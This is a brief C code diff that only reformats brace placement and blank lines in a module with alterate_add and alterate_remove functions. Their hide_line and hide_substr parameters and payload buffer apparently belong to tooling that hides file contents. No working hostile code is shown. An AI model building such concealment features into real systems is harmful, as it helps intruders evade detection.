@@ -20,8 +20,7 @@ void alterate_exit(void) {
     ulist_clear(&alt_list);
 }
 
-int alterate_add(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst)
-{
+int alterate_add(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst) {
     int ret;
     char payload[512];
     char modpath[256];
@@ -50,7 +49,6 @@ int alterate_add(const char *path, int hide_line, const char *hide_substr, const
 
     return SUCCESS;
 }
-
 
 int alterate_remove(const char *path) {
     int ret;
